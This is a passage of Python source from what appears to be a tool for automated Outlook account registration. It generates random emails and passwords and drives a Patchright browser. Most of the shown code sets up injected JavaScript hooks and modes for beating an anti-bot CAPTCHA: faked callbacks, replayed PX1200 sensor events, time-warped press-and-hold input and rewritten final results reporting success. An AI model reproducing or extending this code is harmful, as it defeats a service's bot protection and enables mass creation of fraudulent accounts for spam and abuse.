        runtime_config.write_text(json.dumps(data, ensure_ascii=False, indent=4), encoding="utf-8")
        os.environ["OUTLOOK_REGISTER_CONFIG"] = str(runtime_config)
        args.config = str(runtime_config)
        data = load_config()
        print(
            "[Probe] runtime override config="
            f"{runtime_config} wait={data.get('manual_captcha_wait_seconds')}s "
            f"post_wait={data.get('manual_post_verify_wait_seconds')}s "
            f"cdp={'yes' if data.get('patchright', {}).get('cdp_endpoint') else 'no'}"
        )
    out_dir = Path("Results") / "protocol_runtime"
    out_dir.mkdir(parents=True, exist_ok=True)
    run_log = out_dir / f"{datetime.now().strftime('%Y%m%d_%H%M%S')}_live_probe.log"
    tee_fh = install_tee_log(run_log)
    print(f"[Probe] tee log={run_log}")

    email_user = normalize_email_arg(args.email, data["email_suffix"]) if args.email else random_email()
    password = args.password or generate_strong_password()
    email_full = email_user + data["email_suffix"]

    controller = PatchrightController()
    page = None
    result = False
    try:
        functions = [x.strip() for x in args.fake_functions.split(",") if x.strip()]
        auto_actions = make_auto_actions(
            args.mode,
            functions,
            args.replay,
            args.max_replay_events,
            synthetic_hold_ms=args.synthetic_hold_ms,
            time_warp_hold_ms=args.time_warp_hold_ms,
            time_warp_wall_ms=args.time_warp_wall_ms,
            time_warp_stop_delay_ms=args.time_warp_stop_delay_ms,
            time_warp_install_mode=args.time_warp_install_mode,
            time_warp_clock_mode=args.time_warp_clock_mode,
            normalize_px1200_timing=args.normalize_px1200_timing,
            px1200_timing_profile=args.px1200_timing_profile,
            replace_px561_from_px1200=args.replace_px561_from_px1200,
            align_px561_timing_from_px1200=args.align_px561_timing_from_px1200,
            inject_knp_sandbox_event=args.inject_knp_sandbox_event,
            exact_knp_wait_ms=args.exact_knp_wait_ms,
            exact_knp_fallback_grace_ms=args.exact_knp_fallback_grace_ms,
            synthetic_u0_enabled=not args.disable_synthetic_u0,
            synthetic_u0_lead_ms=args.synthetic_u0_lead_ms,
            preserve_final_bfa=args.preserve_final_bfa,
            early_w0_drain_before_final_ms=args.early_w0_drain_before_final_ms,
            early_w0_drain_after_final_ms=args.early_w0_drain_after_final_ms,
            delayed_final_hard_extra_ms=args.delayed_final_hard_extra_ms,
        )
        hook_js = build_runtime_hook_js(auto_actions)
        page = new_page_with_context_hook(
            controller,
            hook_js,
            install_top_hook=not args.route_only_hook,
            install_route_hook=not args.defer_route_hook_until_proof,
            normalize_y1nz_preproof=args.normalize_y1nz_preproof,
            final_proof_mode=args.final_proof_normalizer,
            preserve_final_bfa=args.preserve_final_bfa,
            optimistic_final_success=args.optimistic_final_success,
            optimistic_w0_success=args.optimistic_w0_success,
            rewrite_final_result_success=args.rewrite_final_result_success,
            trigger_final_success_signals=args.trigger_final_success_signals,
            defer_final_result_to_w0=args.defer_final_result_to_w0,
            defer_final_result_to_w0_wait_ms=args.defer_final_result_to_w0_wait_ms,
            neutral_final_fetch_w0=args.neutral_final_fetch_w0,
            neutral_final_merge_w0_success=args.neutral_final_merge_w0_success,
            neutral_final_cached_w0_success=args.neutral_final_cached_w0_success,
            neutral_final_cached_rich_w0_success=args.neutral_final_cached_rich_w0_success,
            real_final_neutral_w0_success=args.real_final_neutral_w0_success,
            session_cached_rich_final_success=args.session_cached_rich_final_success,
            session_cached_rich_w0_success=args.session_cached_rich_w0_success,
            session_cached_rich_final_and_w0_success=(
                args.session_cached_rich_final_and_w0_success
                or args.warmup_neutral_then_rich_final_and_w0_success
            ),
            warmup_neutral_then_rich_final_and_w0_success=args.warmup_neutral_then_rich_final_and_w0_success,
            session_cached_rich_initial_w0_delay_ms=args.session_cached_rich_initial_w0_delay_ms,
            async_early_cached_rich_w0=args.async_early_cached_rich_w0,
            final_response_delay_ms=args.final_response_delay_ms,
            suppress_unforced_final_for_synthetic=args.suppress_unforced_final_for_synthetic,
            delay_captcha_close_ms=args.delay_captcha_close_ms,
            risk_verify_gate_ms=args.risk_verify_gate_ms,
            risk_verify_gate_timeout_ms=args.risk_verify_gate_timeout_ms,
            risk_verify_human_success_age_ms=args.risk_verify_human_success_age_ms,
            risk_verify_human_success_timeout_ms=args.risk_verify_human_success_timeout_ms,
            risk_verify_challenge_to_continue=args.risk_verify_challenge_to_continue,
        )

        if args.mode == "fake_callback":
            controller.handle_captcha = lambda p: protocol_fake_callback(
                p, out_dir, email_full, args.mode, functions, args.wait_before_ms, args.wait_after_ms, args.replay
            )
        elif args.mode == "replay_px1200":
            if not args.replay:
                raise SystemExit("--replay is required for replay_px1200")
            # Trim replay file in memory if requested by creating a temporary filtered list.
            if args.max_replay_events:
                calls = extract_replay_events(args.replay, args.max_replay_events)
                tmp = out_dir / f"tmp_replay_{int(time.time())}.json"
                tmp.write_text(json.dumps({"frames": [{"probe": {"events": [
                    {"kind": "api_call", "data": {"name": "PX1200", "args": c}} for c in calls
                ]}}]}, ensure_ascii=False), encoding="utf-8")
                replay_path = str(tmp)
            else:
                replay_path = args.replay
            controller.handle_captcha = lambda p: protocol_replay_px1200(
                p, out_dir, email_full, args.mode, replay_path, args.replay_delay_ms, args.wait_before_ms, args.wait_after_ms
            )
        elif args.mode == "fast_cdp_hold":
            controller.handle_captcha = lambda p: protocol_fast_cdp_hold(
                controller,
                p,
                out_dir,
                email_full,
                args.mode,
                args.wait_before_ms,
                args.wait_after_ms,
                args.fast_hold_ms,
                args.fast_wall_wait_ms,
            )
        elif args.mode == "synthetic_px1200":
            if not args.replay:
                raise SystemExit("--replay is required for synthetic_px1200 (PX1200 template)")
            controller.handle_captcha = lambda p: protocol_wait_auto_invoke(
                controller, p, out_dir, email_full, args.mode, args.wait_before_ms, args.wait_after_ms
            )
        elif args.mode == "time_warp_hold":
            controller.handle_captcha = lambda p: protocol_time_warp_hold(
                controller,
                p,
                out_dir,
                email_full,
                args.mode,
                args.wait_before_ms,
                args.wait_after_ms,
                args.time_warp_hold_ms,
                args.time_warp_wall_ms,
                args.time_warp_stop_delay_ms,
                args.time_warp_prewait_ms,
                args.time_warp_pre_down_dwell_ms,
                args.time_warp_frame_scope,
                args.time_warp_install_mode,
                args.skip_mid_snapshots,
                max(1, args.time_warp_attempts),
                hook_js,
                args.defer_route_hook_until_proof,
                args.time_warp_retry_visible_challenge_after_ms,
                args.time_warp_finished_stable_ms,
                args.abort_on_score1,
                args.legacy_short_hold_input,
                args.dense_cdp_hold_input,
                args.hybrid_legacy_down_cdp_move_up,
                args.hybrid_legacy_down_cdp_move_legacy_up,
                args.hybrid_page_move_count,
                args.legacy_short_hold_steps,
                args.async_raw_cdp_release_ms,
                args.raw_cdp_endpoint or args.cdp_endpoint,
                args.hybrid_page_move_for_click,
                args.hybrid_page_move_no_reply,
                args.async_raw_cdp_release_no_wait,
                args.oopif_cdp_hold_input,
                args.oopif_cdp_no_wait,
                args.native_sendinput_hold_input,
                args.min_runtime_hook_ready_frames,
                args.min_knp_prestart_ok,
                args.require_chctx_runtime_ready,
                args.prehold_hook_guard_retries,
                args.force_synthetic_final_on_timeout,
                args.force_synthetic_final_template_network,
                args.force_synthetic_final_preserve_bfa,
                args.force_synthetic_final_trigger_signals,
                args.force_synthetic_final_after_hold_ms,
                args.force_synthetic_final_no_u0,
                args.captcha_close_grace_ms,
                args.prehold_readiness_gate_ms,
                args.prehold_loaded_min_age_ms,
                args.real_target_wait_ms,
            )
        elif args.mode == "virtual_time_hold":
            controller.handle_captcha = lambda p: protocol_virtual_time_hold(
                controller,
                p,
                out_dir,
                email_full,
                args.mode,
                args.wait_before_ms,
                args.wait_after_ms,
                args.virtual_hold_ms,
                args.virtual_real_wait_ms,
            )
        elif args.mode in ("chctx_score_probe", "chctx_score_probe_hooked"):
            controller.handle_captcha = lambda p: protocol_chctx_score_probe(
                p,
                out_dir,
                email_full,
                args.mode,
                args.score_probe_stop_after_chctx_ms,
            )
        else:
            original_handle_captcha = controller.handle_captcha

            def observe_handle_captcha(p):
                ok = original_handle_captcha(p)
                try:
                    path, data_saved = save_probe_state(p, out_dir, email_full, args.mode, "after_captcha")
                    print(f"[Probe] saved after_captcha: {path}")
                    summarize_probe(data_saved)
                except Exception as exc:
                    print(f"[Probe] after_captcha save failed: {exc!r}")
                return ok

            controller.handle_captcha = observe_handle_captcha

        print(f"[Probe] mode={args.mode} email={email_full}")
        result = controller.outlook_register(page, email_user, password)
        print(f"[Probe] outlook_register result={result}")
        final_path, final_data = save_probe_state(page, out_dir, email_full, args.mode, "final")
        print(f"[Probe] saved final: {final_path}")
        summarize_probe(final_data)
        return 0 if result else 1
    finally:
        try:
            if page:
                save_probe_state(page, out_dir, email_full, args.mode, "cleanup")
        except Exception:
            pass
        controller.clean_up(page, "done_browser")
        controller.clean_up(type="all_browser")
        try:
            if tee_fh:
                tee_fh.close()
        except Exception:
            pass


if __name__ == "__main__":
    raise SystemExit(main())
